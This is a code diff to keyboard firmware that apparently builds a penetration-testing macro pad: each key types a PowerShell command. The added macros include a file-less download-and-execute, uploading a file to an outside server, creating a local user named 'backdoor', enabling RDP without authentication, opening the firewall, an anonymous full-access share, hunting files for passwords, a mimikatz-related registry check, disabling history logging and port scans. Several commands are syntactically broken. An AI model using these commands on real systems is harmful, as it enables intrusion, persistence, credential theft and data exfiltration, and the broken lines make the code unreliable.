@@ -25,6 +25,45 @@ enum custom_keycodes {
     PS03,
     PS04,
     PS05,
+    PS06,
+    PS07,
+    PS08,
+    PS09,
+    PS10,
+    PS11,
+    PS12,
+    PS13,
+    PS14,
+    PS15,
+    PS16,
+    PS17,
+    PS18,
+    PS19,
+    PS20,
+    PS21,
+    PS22,
+    PS23,
+    PS24,
+    PS25,
+    PS26,
+    PS27,
+    PS28,
+    PS29,
+    PS30,
+    PS31,
+    PS32,
+    PS33,
+    PS34,
+    PS35,
+    PS36,
+    PS37,
+    PS38,
+    PS39,
+    PS40,
+    PS41,
+    PS42,
+    PS43,
+    PS44,
 };
 
 // in keyboard.c
@@ -127,9 +166,9 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
         }
         break;
 
-    case PS05: // this checks the powershell version
+    case PS05: // set MAC address
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("Set-NetAdapter -Name \"EXAMPLE HERE\" -MacAddress \"00-01-02-03-04-05\""); 
         }
         break;
     
@@ -213,7 +252,7 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
                        
     case PS19: // Check for LSASS WDigest caching. If value is 0, mimikatz won't work and you'll have to use the next command. Otherwise enjoy!
         if (record->event.pressed) {
-           SEND_STRING("gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
+           SEND_STRING("(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
         }
         break;
                        
@@ -223,48 +262,150 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS21: // Checks for credentials in group policy preferences.
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password; Pop-Location"); 
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS22: // Enable RDP connections
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("Get-WmiObject -Class \"Win32_TerminalServiceSetting\" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1); Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\cimv2\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0); Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True"); 
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS23: // Host discovery using mass DNS reverse lookup
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("$net = "10.10.1."0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\s+\","").replace(\"`r\","").replace(\"`n\"," "); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt"); 
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS24: // Port scan a host for interesting ports
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("$ip = "10.10.15.232"; $ports = "21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017"; $ports.split(" ") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) \"Port $_ is open on $ip\"} 2>$null"); 
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS25: // scan network for a single port
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("$port = 22; $net = "10.10.0."0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) \"Port $port is open on $net$_\"} 2>$null"); 
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS26: // Create a guest SMB shared drive
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("new-item \"c:\users\public\share\" -itemtype directory New-SmbShare -Name \"sharedir\" -Path \"C:\users\public\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\"");
         }
         break;
                        
-    case PS01: // this checks the powershell version
+    case PS27: // delete the previously created SMB drive
         if (record->event.pressed) {
-           SEND_STRING("$PSVersionTable"); 
+           SEND_STRING("Remove-SmbShare -Name "sharedir" -Force"); 
         }
         break;
                        
+    case PS28: // Whitelist an IP address in Windows firewall
+        if (record->event.pressed) {
+           SEND_STRING("New-NetFirewallRule -Action Allow -DisplayName \"pentest\" -RemoteAddress 10.10.15.123"); 
+        }
+        break;
+
+    case PS29: // remove the firewall rule created in PS28
+        if (record->event.pressed) {
+           SEND_STRING("Remove-NetFirewallRule -DisplayName \"pentest\""); 
+        }
+        break;
+
+    case PS30: // File-less download and execute
+        if (record->event.pressed) {
+           SEND_STRING("iex(iwr(\"https://URL\"))"); 
+        }
+        break;
+
+    case PS31: // Get current user SID
+        if (record->event.pressed) {
+           SEND_STRING("([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"); 
+        }
+        break;
+
+    case PS32: // Check if we're admin
+        if (record->event.pressed) {
+           SEND_STRING("If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")) { echo \"yes\"; } else { echo \"no\"; }"); 
+        }
+        break;
+
+    case PS33: // Disable powershell logging. (probably only useful in red team exercises)
+        if (record->event.pressed) {
+           SEND_STRING("Set-PSReadlineOption –HistorySaveStyle SaveNothing"); 
+        }
+        break;
+
+    case PS34: // Check what antivirus is installed
+        if (record->event.pressed) {
+           SEND_STRING("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"); 
+        }
+        break;
+
+    case PS35: // record powershell session to file
+        if (record->event.pressed) {
+           SEND_STRING("$Start-Transcript c:\path\to\record.txt"); 
+        }
+        break;
+
+    case PS36: // Check computer domain
+        if (record->event.pressed) {
+           SEND_STRING("(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain"); 
+        }
+        break;
+
+    case PS37: // Get workgroup name
+        if (record->event.pressed) {
+           SEND_STRING("(Get-WmiObject -Class Win32_ComputerSystem).Workgroup"); 
+        }
+        break;
+
+    case PS38: // Check Program Files directories
+        if (record->event.pressed) {
+           SEND_STRING("Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"); 
+        }
+        break;
+
+    case PS39: // List local users
+        if (record->event.pressed) {
+           SEND_STRING("Get-LocalUser | ft Name,Enabled,LastLogon"); 
+        }
+        break;
+
+    case PS40: // List of local admins
+        if (record->event.pressed) {
+           SEND_STRING("Get-LocalGroupMember Administrators"); 
+        }
+        break;
+
+    case PS41: // Create new local admin
+        if (record->event.pressed) {
+           SEND_STRING("New-LocalUser \"backdoor\" -Password (ConvertTo-SecureString \"P@ssw0rd\" -AsPlainText -Force)"); 
+        }
+        break;
+
+    case PS42: // Upload file to HTTP server. Pairs well with https://gist.github.com/UniIsland/3346170
+        if (record->event.pressed) {
+           SEND_STRING("(New-Object System.Net.WebClient).UploadFile(\"http://192.168.204.190/\", \"POST\", \"c:\test\file.zip\");"); 
+        }
+        break;
+
+    case PS43: // List proxy settings
+        if (record->event.pressed) {
+           SEND_STRING("gp \"Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\""); 
+        }
+        break;
+
+    case PS44: // Send an email
+        if (record->event.pressed) {
+           SEND_STRING("Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject \"subject\" -Body \"message\" -Attachment c:\path\to\attachment"); 
+        }
+        break;
+
     }
     return true;
 };
